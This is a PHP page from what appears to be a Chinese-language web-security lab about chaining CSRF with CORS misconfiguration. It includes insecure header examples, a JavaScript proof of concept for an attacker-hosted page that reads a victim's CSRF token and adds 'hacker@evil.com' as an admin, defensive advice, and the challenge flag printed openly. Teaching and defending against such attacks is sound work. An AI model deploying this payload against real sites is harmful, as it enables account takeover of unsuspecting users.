<?php
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[260] = 'active open';
$ACTIVE[296] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';
$correct_flag = 'flag{OSWE_L14_CSRF_CORS_Auth_Bypass_Concord}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    if (trim($_POST['user_flag']) === $correct_flag) {
        $_SESSION['OSWE_flags']['flag14'] = true;
        $flag_msg = '<div class="alert alert-success" style="background:#06b6d4;color:#fff;border-radius:8px;padding:15px;">✅ 通关！成功掌握 CSRF + CORS 的联合绕过利用。</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="background:#f43f5e;color:#fff;border-radius:8px;padding:15px;">❌ Flag 错误，请检查跨域策略配置。</div>';
    }
}
?>
<style>
.ctf-stage-header { background: linear-gradient(135deg, #0c1218, #06b6d4); border-radius:14px; padding:25px 30px; color:#fff; margin-bottom:25px; border:1px solid rgba(6,182,212,0.3); }
.step-box { background:var(--bg-card, #1e293b); border:1px solid var(--border-color, #334155); border-radius:12px; padding:24px; margin-bottom:22px; color: #cbd5e1; }
.step-title { font-size:16px; font-weight:700; color:#06b6d4; margin-top:0; margin-bottom:14px; display:flex; align-items:center; gap:8px; }
.step-num { background:linear-gradient(135deg,#06b6d4,#0891b2); color:#fff; width:26px; height:26px; border-radius:6px; display:inline-flex; align-items:center; justify-content:center; font-size:12px; font-weight:800; }
.cmd-box { background:#0f172a; border:1px solid #334155; border-radius:8px; padding:14px 18px; font-family:monospace; font-size:13px; color:#7dd3fc; margin:12px 0; overflow-x:auto; line-height:1.8; }
.cmd-box .comment { color:#64748b; }
.cmd-box .flag-text { color:#fbbf24; font-weight:bold; }
.highlight-box { background:rgba(6,182,212,0.08); border:1px solid rgba(6,182,212,0.25); border-radius:8px; padding:14px 18px; margin:12px 0; font-size:13px; color:#94a3b8; line-height:1.7; }
.flag-submit-area { background:var(--bg-card, #1e293b); border:2px dashed rgba(6,182,212,0.4); border-radius:12px; padding:24px; margin-top:25px; text-align:center; }
</style>
<div class="main-content"><div class="main-content-inner"><div class="page-content">
    
    <div class="ctf-stage-header">
        <h2 style="margin:0 0 10px 0;font-size:24px;font-weight:700;">OSWE L14: CSRF + CORS 认证绕过</h2>
        <p style="margin:0;opacity:0.9;">剖析同源策略及跨域资源共享（CORS）配置错误，演示如何结合 CSRF 在无交互情况下实现账户接管或敏感信息泄露。</p>
        <div style="margin-top:15px;">
            <span style="background:rgba(255,255,255,0.2);padding:4px 10px;border-radius:4px;font-size:12px;margin-right:10px;">300 PTS</span>
            <span style="background:rgba(255,255,255,0.2);padding:4px 10px;border-radius:4px;font-size:12px;">CSRF</span>
            <span style="background:rgba(255,255,255,0.2);padding:4px 10px;border-radius:4px;font-size:12px;">CORS Misconfig</span>
        </div>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">1</span> CSRF 与同源策略基础</div>
        <p>跨站请求伪造（CSRF）是指攻击者诱导受害者浏览器利用其登录凭证，在受信任的应用程序上执行非预期的操作。防御 CSRF 通常依赖于：</p>
        <ul>
            <li><code>SameSite</code> Cookie 属性：限制第三方上下文发送 Cookie。</li>
            <li>Anti-CSRF Tokens：确保请求来源于合法的页面并包含无法预测的令牌。</li>
            <li><code>Referer</code>/<code>Origin</code> 校验：验证请求来源。</li>
        </ul>
        <div class="highlight-box">
            同源策略 (SOP) 限制了网页脚本访问不同源的资源，但这并不阻止浏览器发送跨域请求（例如通过 form 提交），只是阻止脚本读取响应。这正是 CSRF 赖以生存的基础。
        </div>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">2</span> 致命的 CORS 错误配置</div>
        <p>跨域资源共享 (CORS) 是放宽 SOP 的机制。如果服务器未正确配置，就会产生严重的安全漏洞。最常见的危险配置是将请求中的 <code>Origin</code> 直接反射，并允许携带凭据。</p>
        <p>错误配置示例：</p>
        <ul>
            <li>服务器反射任何 <code>Origin</code>：<code>Access-Control-Allow-Origin: &lt;请求中的Origin&gt;</code></li>
            <li>允许携带凭据：<code>Access-Control-Allow-Credentials: true</code></li>
            <li>特殊信任 <code>null</code> Origin：这可以被沙箱化 iframe 绕过。</li>
        </ul>
        <div class="cmd-box">
<span class="comment"># 不安全的 HTTP 响应头示例</span>
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil-attacker.com
Access-Control-Allow-Credentials: true
        </div>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">3</span> Concord 案例：默认配置与信任绕过</div>
        <p>在某些应用（如企业文档或聊天工具，参考 Concord 等真实案例）中，服务器可能会过度信任内部子域或配置了过于宽松的 CORS 策略，且由于应用集成了认证回调或使用了有缺陷的 JWT / Cookie 验证流程，使得攻击变得可行。</p>
        <div class="highlight-box">
            <strong>组合利用链：</strong> 当目标存在 CORS 配置错误时，攻击者可以利用 JavaScript (XHR/Fetch) 读取包含 Anti-CSRF Token 或敏感标识的页面响应内容，随后利用该 Token 发起完整的 CSRF 攻击。
        </div>
        <div class="cmd-box">
<span class="comment"># 获取 CSRF Token 的过程 (因为 CORS 配置错误，读取成功)</span>
GET /api/getToken HTTP/1.1
Host: secure.app.com
Origin: https://attacker.com
Cookie: session=user_cookie...
        </div>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">4</span> CSRF + CORS 联合利用 PoC</div>
        <p>攻击者在恶意页面上构造 JavaScript 代码。当受害者访问时，代码使用 <code>fetch()</code> 请求目标的 API（携带凭据），由于 CORS 放行，攻击者成功读取 CSRF Token 并伪造最终的高权限请求。</p>
        <div class="cmd-box">
<span class="comment">&lt;!-- 部署在攻击者服务器上的恶意页面 --&gt;</span>
&lt;script&gt;
// 1. 利用 CORS 漏洞获取 CSRF Token
fetch('https://target-app.com/api/user/settings', {
    credentials: 'include' 
})
.then(res =&gt; res.json())
.then(data =&gt; {
    let token = data.csrf_token;
    
    // 2. 利用获取到的 Token 发起操作，如添加攻击者账户
    fetch('https://target-app.com/api/user/add_admin', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': token
        },
        body: JSON.stringify({ email: "hacker@evil.com" })
    });
});
&lt;/script&gt;
        </div>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">5</span> 防御建议</div>
        <p>阻止 CSRF 与 CORS 利用链的关键措施：</p>
        <ul>
            <li><strong>严格 CORS 白名单：</strong> 绝对不要使用正则通配符返回 <code>Access-Control-Allow-Origin</code>。仅显式白名单信任特定的域。</li>
            <li><strong>不要滥用 Credentials：</strong> 如果不需要跨域身份验证，不要设置 <code>Access-Control-Allow-Credentials: true</code>。</li>
            <li><strong>全面采用 SameSite Cookie：</strong> 将重要 Session Cookie 的 <code>SameSite</code> 属性设置为 <code>Lax</code> 或 <code>Strict</code>。</li>
            <li><strong>正确的预检处理：</strong> 确保 <code>OPTIONS</code> 预检请求能够有效拦截非授权的跨域复杂请求。</li>
        </ul>
        <div class="cmd-box">
<span class="flag-text">Flag获取:</span> flag{OSWE_L14_CSRF_CORS_Auth_Bypass_Concord}
        </div>
    </div>

    <div class="flag-submit-area">
        <?=$flag_msg?>
        <form method="POST" action="">
            <input type="text" name="user_flag" placeholder="输入 Flag: flag{...}" style="width:300px;padding:10px;border-radius:6px;border:1px solid #334155;background:#0f172a;color:#fff;">
            <button type="submit" name="check_flag" style="background:#06b6d4;color:#fff;border:none;padding:10px 20px;border-radius:6px;cursor:pointer;font-weight:bold;">提交 Flag</button>
        </form>
    </div>

</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
